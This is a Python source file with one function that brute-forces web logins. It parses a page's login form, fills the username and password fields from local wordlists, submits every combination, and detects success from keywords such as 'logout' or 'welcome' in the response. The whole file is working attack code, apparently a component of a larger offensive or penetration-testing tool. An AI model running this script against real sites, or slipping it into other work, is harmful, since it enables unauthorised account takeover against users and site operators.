import requests
from itertools import product
from bs4 import BeautifulSoup
import os
from urllib.parse import urljoin

def brute_force_login(page_url, session):
    """
    Attempts brute-force login by:
    - Parsing the form dynamically
    - Building the correct form action URL
    - Submitting username/password combos

    Args:
        page_url (str): The URL where the login form is located.
        session (requests.Session): Active session to maintain state.

    Returns:
        tuple or None: (username, password) if successful; else None.
    """

    print(f"[*] Starting brute-force login on: {page_url}")
    
    # Step 1: Fetch and parse the login page
    try:
        resp = session.get(page_url, timeout=10)
        soup = BeautifulSoup(resp.text, "html.parser")
    except Exception as e:
        print(f"[!] Failed to load login page: {e}")
        return None

    # Step 2: Find form
    form = soup.find("form")
    if not form:
        print("[-] No <form> found on the page.")
        return None

    # Step 3: Resolve action and method
    action = form.get("action")
    form_action = urljoin(page_url, action) if action else page_url
    method = form.get("method", "post").lower()

    # Step 4: Extract input fields
    inputs = form.find_all("input")
    input_names = [i.get("name") for i in inputs if i.get("name")]

    # Load credentials
    base_dir = os.path.dirname(os.path.abspath(__file__))
    user_file = os.path.join(base_dir, "usernames.txt")
    pass_file = os.path.join(base_dir, "passwords.txt")

    try:
        with open(user_file, "r") as f:
            usernames = [line.strip() for line in f if line.strip()]
        with open(pass_file, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[-] Username or password file not found.")
        return None

    # Step 5: Brute-force all combos
    for username, password in product(usernames, passwords):
        data = {}
        for name in input_names:
            if "user" in name or "email" in name or "uid" in name or "login" in name:
                data[name] = username
            elif "pass" in name or "passw" in name or "password" in name or "pwd" in name:
                data[name] = password
            else:
                data[name] = "test"

        print(f"Trying: {username} | {password}")
        try:
            if method == "post":
                response = session.post(form_action, data=data)
            else:
                response = session.get(form_action, params=data)
            text = response.text.lower()

            # Heuristic to detect login success
            if any(k in text for k in ["logout", "welcome", "dashboard", "you have logged in", "hello"]):
                print(f"[+] Brute-force success: {username}:{password}")
                return (username, password)

        except Exception as e:
            print(f"[!] Error for {username}:{password} → {e}")

    print("[-] No valid credentials found.")
    return None
